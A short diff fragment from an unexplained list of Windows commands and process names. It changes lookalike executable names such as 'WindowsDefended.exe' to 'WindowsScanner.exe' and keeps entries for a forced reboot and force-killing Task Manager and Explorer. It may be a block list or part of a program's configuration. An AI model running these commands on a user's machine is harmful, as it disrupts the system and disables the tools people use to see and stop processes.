@@ -6,8 +6,8 @@ copy
 rename 
 shutdown -r -t 0
 taskkill /f /im 
-WindowsDefended.exe
-Win32InstallProduct.exe
+WindowsScanner.exe
+Win32InstallProducted.exe
 SystemSettings.exe
 Taskmgr.exe
 explorer.exe
